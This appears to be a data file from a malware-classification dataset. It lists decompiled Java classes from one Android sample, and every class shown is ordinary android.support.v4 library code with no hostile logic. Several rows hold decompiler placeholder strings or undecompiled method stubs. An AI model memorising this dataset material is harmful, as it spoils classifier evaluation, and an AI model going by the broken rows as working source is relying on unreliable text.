} "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\WakefulBroadcastReceiver.code","public abstract class WakefulBroadcastReceiver extends BroadcastReceiver {   private static final String EXTRA_WAKE_LOCK_ID=""android.support.content.wakelockid"";   private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks=new SparseArray<>();   private static int mNextId=1;   public static ComponentName startWakefulService(  Context context,  Intent intent){     ComponentName comp; synchronized (mActiveWakeLocks) {       int id=mNextId;       mNextId++;       if (mNextId <= 0) {         mNextId=1;       }       intent.putExtra(EXTRA_WAKE_LOCK_ID,id);       comp=context.startService(intent);       if (comp == null) {         comp=null;       }  else {         PowerManager pm=(PowerManager)context.getSystemService(""power"");         PowerManager.WakeLock wl=pm.newWakeLock(1,""wake:"" + comp.flattenToShortString());         wl.setReferenceCounted(false);         wl.acquire(60000L);         mActiveWakeLocks.put(id,wl);       }     }     return comp;   }   public static boolean completeWakefulIntent(  Intent intent){     boolean z=false;     int id=intent.getIntExtra(EXTRA_WAKE_LOCK_ID,0);     if (id != 0) { synchronized (mActiveWakeLocks) {         PowerManager.WakeLock wl=mActiveWakeLocks.get(id);         if (wl != null) {           wl.release();           mActiveWakeLocks.remove(id);           z=true;         }  else {           Log.w(""WakefulBroadcastReceiver"",""No active wake lock id #"" + id);           z=true;         }       }     }     return z;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\WorkerRunnable.code","public static abstract class WorkerRunnable<Params,Result> implements Callable<Result> {   Params[] mParams;   private WorkerRunnable(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content.pm\ActivityInfoCompat.code","public class ActivityInfoCompat {   public static final int CONFIG_UI_MODE=512;   private ActivityInfoCompat(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.database\DatabaseUtilsCompat.code","public class DatabaseUtilsCompat {   private DatabaseUtilsCompat(){   }   public static String concatenateWhere(  String a2,  String b2){     if (TextUtils.isEmpty(a2)) {       return b2;     }     return TextUtils.isEmpty(b2) ? a2 : ""("" + a2 + "") AND (""+ b2+ "")"";   }   public static String[] appendSelectionArgs(  String[] originalValues,  String[] newValues){     if (originalValues == null || originalValues.length == 0) {       return newValues;     }     String[] result=new String[originalValues.length + newValues.length];     System.arraycopy(originalValues,0,result,0,originalValues.length);     System.arraycopy(newValues,0,result,originalValues.length,newValues.length);     return result;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.graphics.drawable\BaseDrawableImpl.code","static class BaseDrawableImpl implements DrawableImpl {   BaseDrawableImpl(){   }   @Override public void jumpToCurrentState(  Drawable drawable){   }   @Override public void setAutoMirrored(  Drawable drawable,  boolean mirrored){   }   @Override public boolean isAutoMirrored(  Drawable drawable){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.graphics.drawable\DrawableCompat.code","public class DrawableCompat {   static final DrawableImpl IMPL; interface DrawableImpl {     boolean isAutoMirrored(    Drawable drawable);     void jumpToCurrentState(    Drawable drawable);     void setAutoMirrored(    Drawable drawable,    boolean z);   } static class BaseDrawableImpl implements DrawableImpl {     BaseDrawableImpl(){     }     @Override public void jumpToCurrentState(    Drawable drawable){     }     @Override public void setAutoMirrored(    Drawable drawable,    boolean mirrored){     }     @Override public boolean isAutoMirrored(    Drawable drawable){       return false;     }   } static class HoneycombDrawableImpl extends BaseDrawableImpl {     HoneycombDrawableImpl(){     }     @Override public void jumpToCurrentState(    Drawable drawable){       DrawableCompatHoneycomb.jumpToCurrentState(drawable);     }   } static class KitKatDrawableImpl extends HoneycombDrawableImpl {     KitKatDrawableImpl(){     }     @Override public void setAutoMirrored(    Drawable drawable,    boolean mirrored){       DrawableCompatKitKat.setAutoMirrored(drawable,mirrored);     }     @Override public boolean isAutoMirrored(    Drawable drawable){       return DrawableCompatKitKat.isAutoMirrored(drawable);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatDrawableImpl();     }  else     if (version >= 11) {       IMPL=new HoneycombDrawableImpl();     }  else {       IMPL=new BaseDrawableImpl();     }   }   public static void jumpToCurrentState(  Drawable drawable){     IMPL.jumpToCurrentState(drawable);   }   public static void setAutoMirrored(  Drawable drawable,  boolean mirrored){     IMPL.setAutoMirrored(drawable,mirrored);   }   public static boolean isAutoMirrored(  Drawable drawable){     return IMPL.isAutoMirrored(drawable);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.graphics.drawable\DrawableCompatHoneycomb.code","class DrawableCompatHoneycomb {   DrawableCompatHoneycomb(){   }   public static void jumpToCurrentState(  Drawable drawable){     drawable.jumpToCurrentState();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.graphics.drawable\DrawableCompatKitKat.code","class DrawableCompatKitKat {   DrawableCompatKitKat(){   }   public static void setAutoMirrored(  Drawable drawable,  boolean mirrored){     drawable.setAutoMirrored(mirrored);   }   public static boolean isAutoMirrored(  Drawable drawable){     return drawable.isAutoMirrored();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.graphics.drawable\DrawableImpl.code","interface DrawableImpl {   boolean isAutoMirrored(  Drawable drawable);   void jumpToCurrentState(  Drawable drawable);   void setAutoMirrored(  Drawable drawable,  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.graphics.drawable\HoneycombDrawableImpl.code","static class HoneycombDrawableImpl extends BaseDrawableImpl {   HoneycombDrawableImpl(){   }   @Override public void jumpToCurrentState(  Drawable drawable){     DrawableCompatHoneycomb.jumpToCurrentState(drawable);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.graphics.drawable\KitKatDrawableImpl.code","static class KitKatDrawableImpl extends HoneycombDrawableImpl {   KitKatDrawableImpl(){   }   @Override public void setAutoMirrored(  Drawable drawable,  boolean mirrored){     DrawableCompatKitKat.setAutoMirrored(drawable,mirrored);   }   @Override public boolean isAutoMirrored(  Drawable drawable){     return DrawableCompatKitKat.isAutoMirrored(drawable);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.hardware.display\DisplayManagerCompat.code","public abstract class DisplayManagerCompat {   public static final String DISPLAY_CATEGORY_PRESENTATION=""android.hardware.display.category.PRESENTATION"";   private static final WeakHashMap<Context,DisplayManagerCompat> sInstances=new WeakHashMap<>();   public abstract Display getDisplay(  int i);   public abstract Display[] getDisplays();   public abstract Display[] getDisplays(  String str);   DisplayManagerCompat(){   }   public static DisplayManagerCompat getInstance(  Context context){     DisplayManagerCompat instance; synchronized (sInstances) {       instance=sInstances.get(context);       if (instance == null) {         int version=Build.VERSION.SDK_INT;         if (version >= 17) {           instance=new JellybeanMr1Impl(context);         }  else {           instance=new LegacyImpl(context);         }         sInstances.put(context,instance);       }     }     return instance;   } private static class LegacyImpl extends DisplayManagerCompat {     private final WindowManager mWindowManager;     public LegacyImpl(    Context context){       this.mWindowManager=(WindowManager)context.getSystemService(""window"");     }     @Override public Display getDisplay(    int displayId){       Display display=this.mWindowManager.getDefaultDisplay();       if (display.getDisplayId() == displayId) {         return display;       }       return null;     }     @Override public Display[] getDisplays(){       return new Display[]{this.mWindowManager.getDefaultDisplay()};     }     @Override public Display[] getDisplays(    String category){       return category == null ? getDisplays() : new Display[0];     }   } private static class JellybeanMr1Impl extends DisplayManagerCompat {     private final Object mDisplayManagerObj;     public JellybeanMr1Impl(    Context context){       this.mDisplayManagerObj=DisplayManagerJellybeanMr1.getDisplayManager(context);     }     @Override public Display getDisplay(    int displayId){       return DisplayManagerJellybeanMr1.getDisplay(this.mDisplayManagerObj,displayId);     }     @Override public Display[] getDisplays(){       return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj);     }     @Override public Display[] getDisplays(    String category){       return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj,category);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.hardware.display\DisplayManagerJellybeanMr1.code","final class DisplayManagerJellybeanMr1 {   DisplayManagerJellybeanMr1(){   }   public static Object getDisplayManager(  Context context){     return context.getSystemService(""display"");   }   public static Display getDisplay(  Object displayManagerObj,  int displayId){     return ((DisplayManager)displayManagerObj).getDisplay(displayId);   }   public static Display[] getDisplays(  Object displayManagerObj){     return ((DisplayManager)displayManagerObj).getDisplays();   }   public static Display[] getDisplays(  Object displayManagerObj,  String category){     return ((DisplayManager)displayManagerObj).getDisplays(category);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.hardware.display\JellybeanMr1Impl.code","private static class JellybeanMr1Impl extends DisplayManagerCompat {   private final Object mDisplayManagerObj;   public JellybeanMr1Impl(  Context context){     this.mDisplayManagerObj=DisplayManagerJellybeanMr1.getDisplayManager(context);   }   @Override public Display getDisplay(  int displayId){     return DisplayManagerJellybeanMr1.getDisplay(this.mDisplayManagerObj,displayId);   }   @Override public Display[] getDisplays(){     return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj);   }   @Override public Display[] getDisplays(  String category){     return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj,category);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.hardware.display\LegacyImpl.code","private static class LegacyImpl extends DisplayManagerCompat {   private final WindowManager mWindowManager;   public LegacyImpl(  Context context){     this.mWindowManager=(WindowManager)context.getSystemService(""window"");   }   @Override public Display getDisplay(  int displayId){     Display display=this.mWindowManager.getDefaultDisplay();     if (display.getDisplayId() == displayId) {       return display;     }     return null;   }   @Override public Display[] getDisplays(){     return new Display[]{this.mWindowManager.getDefaultDisplay()};   }   @Override public Display[] getDisplays(  String category){     return category == null ? getDisplays() : new Display[0];   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.internal.view\SupportMenu.code","public interface SupportMenu extends Menu {   public static final int CATEGORY_MASK=-65536;   public static final int CATEGORY_SHIFT=16;   public static final int USER_MASK=65535;   public static final int USER_SHIFT=0; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.internal.view\SupportMenuItem.code","public interface SupportMenuItem extends MenuItem {   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4;   @Override boolean collapseActionView();   @Override boolean expandActionView();   @Override View getActionView();   ActionProvider getSupportActionProvider();   @Override boolean isActionViewExpanded();   @Override MenuItem setActionView(  int i);   @Override MenuItem setActionView(  View view);   @Override void setShowAsAction(  int i);   @Override MenuItem setShowAsActionFlags(  int i);   SupportMenuItem setSupportActionProvider(  ActionProvider actionProvider);   SupportMenuItem setSupportOnActionExpandListener(  MenuItemCompat.OnActionExpandListener onActionExpandListener); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.internal.view\SupportSubMenu.code","public interface SupportSubMenu extends SupportMenu, SubMenu { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.media\TransportController.code","public abstract class TransportController {   public abstract int getBufferPercentage();   public abstract long getCurrentPosition();   public abstract long getDuration();   public abstract int getTransportControlFlags();   public abstract boolean isPlaying();   public abstract void pausePlaying();   public abstract void registerStateListener(  TransportStateListener transportStateListener);   public abstract void seekTo(  long j);   public abstract void startPlaying();   public abstract void stopPlaying();   public abstract void unregisterStateListener(  TransportStateListener transportStateListener); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.media\TransportMediator.code","!org.eclipse.jdt.core.dom.TypeDeclaration@33c8a528"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.media\TransportMediatorCallback.code","interface TransportMediatorCallback {   long getPlaybackPosition();   void handleAudioFocusChange(  int i);   void handleKey(  KeyEvent keyEvent);   void playbackPositionUpdate(  long j); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.media\TransportMediatorJellybeanMR2.code","class TransportMediatorJellybeanMR2 implements RemoteControlClient.OnGetPlaybackPositionListener, RemoteControlClient.OnPlaybackPositionUpdateListener {   boolean mAudioFocused;   final AudioManager mAudioManager;   final Context mContext;   boolean mFocused;   final Intent mIntent;   PendingIntent mPendingIntent;   final String mReceiverAction;   final IntentFilter mReceiverFilter;   RemoteControlClient mRemoteControl;   final View mTargetView;   final TransportMediatorCallback mTransportCallback;   final ViewTreeObserver.OnWindowAttachListener mWindowAttachListener=new ViewTreeObserver.OnWindowAttachListener(){     @Override public void onWindowAttached(){       TransportMediatorJellybeanMR2.this.windowAttached();     }     @Override public void onWindowDetached(){       TransportMediatorJellybeanMR2.this.windowDetached();     }   } ;   final ViewTreeObserver.OnWindowFocusChangeListener mWindowFocusListener=new ViewTreeObserver.OnWindowFocusChangeListener(){     @Override public void onWindowFocusChanged(    boolean hasFocus){       if (!hasFocus) {         TransportMediatorJellybeanMR2.this.loseFocus();       }  else {         TransportMediatorJellybeanMR2.this.gainFocus();       }     }   } ;   final BroadcastReceiver mMediaButtonReceiver=new BroadcastReceiver(){     @Override public void onReceive(    Context context,    Intent intent){       try {         KeyEvent event=(KeyEvent)intent.getParcelableExtra(""android.intent.extra.KEY_EVENT"");         TransportMediatorJellybeanMR2.this.mTransportCallback.handleKey(event);       }  catch (      ClassCastException e) {         Log.w(""TransportController"",e);       }     }   } ;   AudioManager.OnAudioFocusChangeListener mAudioFocusChangeListener=new AudioManager.OnAudioFocusChangeListener(){     @Override public void onAudioFocusChange(    int focusChange){       TransportMediatorJellybeanMR2.this.mTransportCallback.handleAudioFocusChange(focusChange);     }   } ;   int mPlayState=0;   public TransportMediatorJellybeanMR2(  Context context,  AudioManager audioManager,  View view,  TransportMediatorCallback transportCallback){     this.mContext=context;     this.mAudioManager=audioManager;     this.mTargetView=view;     this.mTransportCallback=transportCallback;     this.mReceiverAction=context.getPackageName() + "":transport:"" + System.identityHashCode(this);     this.mIntent=new Intent(this.mReceiverAction);     this.mIntent.setPackage(context.getPackageName());     this.mReceiverFilter=new IntentFilter();     this.mReceiverFilter.addAction(this.mReceiverAction);     this.mTargetView.getViewTreeObserver().addOnWindowAttachListener(this.mWindowAttachListener);     this.mTargetView.getViewTreeObserver().addOnWindowFocusChangeListener(this.mWindowFocusListener);   }   public Object getRemoteControlClient(){     return this.mRemoteControl;   }   public void destroy(){     windowDetached();     this.mTargetView.getViewTreeObserver().removeOnWindowAttachListener(this.mWindowAttachListener);     this.mTargetView.getViewTreeObserver().removeOnWindowFocusChangeListener(this.mWindowFocusListener);   }   void windowAttached(){     this.mContext.registerReceiver(this.mMediaButtonReceiver,this.mReceiverFilter);     this.mPendingIntent=PendingIntent.getBroadcast(this.mContext,0,this.mIntent,268435456);     this.mRemoteControl=new RemoteControlClient(this.mPendingIntent);     this.mRemoteControl.setOnGetPlaybackPositionListener(this);     this.mRemoteControl.setPlaybackPositionUpdateListener(this);   }   void gainFocus(){     if (!this.mFocused) {       this.mFocused=true;       this.mAudioManager.registerMediaButtonEventReceiver(this.mPendingIntent);       this.mAudioManager.registerRemoteControlClient(this.mRemoteControl);       if (this.mPlayState == 3) {         takeAudioFocus();       }     }   }   void takeAudioFocus(){     if (!this.mAudioFocused) {       this.mAudioFocused=true;       this.mAudioManager.requestAudioFocus(this.mAudioFocusChangeListener,3,1);     }   }   public void startPlaying(){     if (this.mPlayState != 3) {       this.mPlayState=3;       this.mRemoteControl.setPlaybackState(3);     }     if (this.mFocused) {       takeAudioFocus();     }   }   @Override public long onGetPlaybackPosition(){     return this.mTransportCallback.getPlaybackPosition();   }   @Override public void onPlaybackPositionUpdate(  long newPositionMs){     this.mTransportCallback.playbackPositionUpdate(newPositionMs);   }   public void refreshState(  boolean playing,  long position,  int transportControls){     if (this.mRemoteControl != null) {       this.mRemoteControl.setPlaybackState(playing ? 3 : 1,position,playing ? 1.0f : 0.0f);       this.mRemoteControl.setTransportControlFlags(transportControls);     }   }   public void pausePlaying(){     if (this.mPlayState == 3) {       this.mPlayState=2;       this.mRemoteControl.setPlaybackState(2);     }     dropAudioFocus();   }   public void stopPlaying(){     if (this.mPlayState != 1) {       this.mPlayState=1;       this.mRemoteControl.setPlaybackState(1);     }     dropAudioFocus();   }   void dropAudioFocus(){     if (this.mAudioFocused) {       this.mAudioFocused=false;       this.mAudioManager.abandonAudioFocus(this.mAudioFocusChangeListener);     }   }   void loseFocus(){     dropAudioFocus();     if (this.mFocused) {       this.mFocused=false;       this.mAudioManager.unregisterRemoteControlClient(this.mRemoteControl);       this.mAudioManager.unregisterMediaButtonEventReceiver(this.mPendingIntent);     }   }   void windowDetached(){     loseFocus();     if (this.mPendingIntent != null) {       this.mContext.unregisterReceiver(this.mMediaButtonReceiver);       this.mPendingIntent.cancel();       this.mPendingIntent=null;       this.mRemoteControl=null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.media\TransportPerformer.code","public abstract class TransportPerformer {   static final int AUDIOFOCUS_GAIN=1;   static final int AUDIOFOCUS_GAIN_TRANSIENT=2;   static final int AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK=3;   static final int AUDIOFOCUS_LOSS=-1;   static final int AUDIOFOCUS_LOSS_TRANSIENT=-2;   static final int AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK=-3;   public abstract long onGetCurrentPosition();   public abstract long onGetDuration();   public abstract boolean onIsPlaying();   public abstract void onPause();   public abstract void onSeekTo(  long j);   public abstract void onStart();   public abstract void onStop();   public int onGetBufferPercentage(){     return 100;   }   public int onGetTransportControlFlags(){     return 60;   }   public boolean onMediaButtonDown(  int r3,  android.view.KeyEvent r4){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.media.TransportPerformer.onMediaButtonDown(int, android.view.KeyEvent):boolean"");   }   public boolean onMediaButtonUp(  int keyCode,  KeyEvent event){     return true;   }   public void onAudioFocusChange(  int focusChange){     int keyCode=0; switch (focusChange) { case -1:       keyCode=TransportMediator.KEYCODE_MEDIA_PAUSE;     break; } if (keyCode != 0) {   long now=SystemClock.uptimeMillis();   onMediaButtonDown(keyCode,new KeyEvent(now,now,0,keyCode,0));   onMediaButtonUp(keyCode,new KeyEvent(now,now,1,keyCode,0)); } } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.media\TransportStateListener.code","public class TransportStateListener {   public void onPlayingChanged(  TransportController controller){   }   public void onTransportControlsChanged(  TransportController controller){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\BaseConnectivityManagerCompatImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7ff9a100"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\BaseTrafficStatsCompatImpl.code","static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){     @Override public SocketTags initialValue(){       return new SocketTags();     }   } ; public static class SocketTags {     public int statsTag;     private SocketTags(){       this.statsTag=-1;     }   }   BaseTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     this.mThreadSocketTags.get().statsTag=-1;   }   @Override public int getThreadStatsTag(){     return this.mThreadSocketTags.get().statsTag;   }   @Override public void incrementOperationCount(  int operationCount){   }   @Override public void incrementOperationCount(  int tag,  int operationCount){   }   @Override public void setThreadStatsTag(  int tag){     this.mThreadSocketTags.get().statsTag=tag;   }   @Override public void tagSocket(  Socket socket){   }   @Override public void untagSocket(  Socket socket){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\ConnectivityManagerCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@78cd1d5c"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\ConnectivityManagerCompatGingerbread.code","!org.eclipse.jdt.core.dom.TypeDeclaration@dd185ef"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\ConnectivityManagerCompatHoneycombMR2.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6ad73de1"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\ConnectivityManagerCompatImpl.code","interface ConnectivityManagerCompatImpl {   boolean isActiveNetworkMetered(  ConnectivityManager connectivityManager); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\ConnectivityManagerCompatJellyBean.code","class ConnectivityManagerCompatJellyBean {   ConnectivityManagerCompatJellyBean(){   }   public static boolean isActiveNetworkMetered(  ConnectivityManager cm){     return cm.isActiveNetworkMetered();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\GingerbreadConnectivityManagerCompatImpl.code","static class GingerbreadConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   GingerbreadConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatGingerbread.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\HoneycombMR2ConnectivityManagerCompatImpl.code","static class HoneycombMR2ConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   HoneycombMR2ConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatHoneycombMR2.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\IcsTrafficStatsCompatImpl.code","static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   IcsTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     TrafficStatsCompatIcs.clearThreadStatsTag();   }   @Override public int getThreadStatsTag(){     return TrafficStatsCompatIcs.getThreadStatsTag();   }   @Override public void incrementOperationCount(  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(operationCount);   }   @Override public void incrementOperationCount(  int tag,  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);   }   @Override public void setThreadStatsTag(  int tag){     TrafficStatsCompatIcs.setThreadStatsTag(tag);   }   @Override public void tagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.tagSocket(socket);   }   @Override public void untagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\JellyBeanConnectivityManagerCompatImpl.code","static class JellyBeanConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   JellyBeanConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatJellyBean.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\SocketTags.code","public static class SocketTags {   public int statsTag;   private SocketTags(){     this.statsTag=-1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\TrafficStatsCompat.code","public class TrafficStatsCompat {   private static final TrafficStatsCompatImpl IMPL; interface TrafficStatsCompatImpl {     void clearThreadStatsTag();     int getThreadStatsTag();     void incrementOperationCount(    int i);     void incrementOperationCount(    int i,    int i2);     void setThreadStatsTag(    int i);     void tagSocket(    Socket socket) throws SocketException ;     void untagSocket(    Socket socket) throws SocketException ;   } static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){       @Override public SocketTags initialValue(){         return new SocketTags();       }     } ; public static class SocketTags {       public int statsTag;       private SocketTags(){         this.statsTag=-1;       }     }     BaseTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       this.mThreadSocketTags.get().statsTag=-1;     }     @Override public int getThreadStatsTag(){       return this.mThreadSocketTags.get().statsTag;     }     @Override public void incrementOperationCount(    int operationCount){     }     @Override public void incrementOperationCount(    int tag,    int operationCount){     }     @Override public void setThreadStatsTag(    int tag){       this.mThreadSocketTags.get().statsTag=tag;     }     @Override public void tagSocket(    Socket socket){     }     @Override public void untagSocket(    Socket socket){     }   } static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     IcsTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       TrafficStatsCompatIcs.clearThreadStatsTag();     }     @Override public int getThreadStatsTag(){       return TrafficStatsCompatIcs.getThreadStatsTag();     }     @Override public void incrementOperationCount(    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(operationCount);     }     @Override public void incrementOperationCount(    int tag,    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);     }     @Override public void setThreadStatsTag(    int tag){       TrafficStatsCompatIcs.setThreadStatsTag(tag);     }     @Override public void tagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.tagSocket(socket);     }     @Override public void untagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.untagSocket(socket);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new IcsTrafficStatsCompatImpl();     }  else {       IMPL=new BaseTrafficStatsCompatImpl();     }   }   public static void clearThreadStatsTag(){     IMPL.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return IMPL.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     IMPL.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     IMPL.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     IMPL.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     IMPL.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     IMPL.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\TrafficStatsCompatIcs.code","class TrafficStatsCompatIcs {   TrafficStatsCompatIcs(){   }   public static void clearThreadStatsTag(){     TrafficStats.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return TrafficStats.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     TrafficStats.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     TrafficStats.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     TrafficStats.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     TrafficStats.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     TrafficStats.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.net\TrafficStatsCompatImpl.code","interface TrafficStatsCompatImpl {   void clearThreadStatsTag();   int getThreadStatsTag();   void incrementOperationCount(  int i);   void incrementOperationCount(  int i,  int i2);   void setThreadStatsTag(  int i);   void tagSocket(  Socket socket) throws SocketException ;   void untagSocket(  Socket socket) throws SocketException ; } "
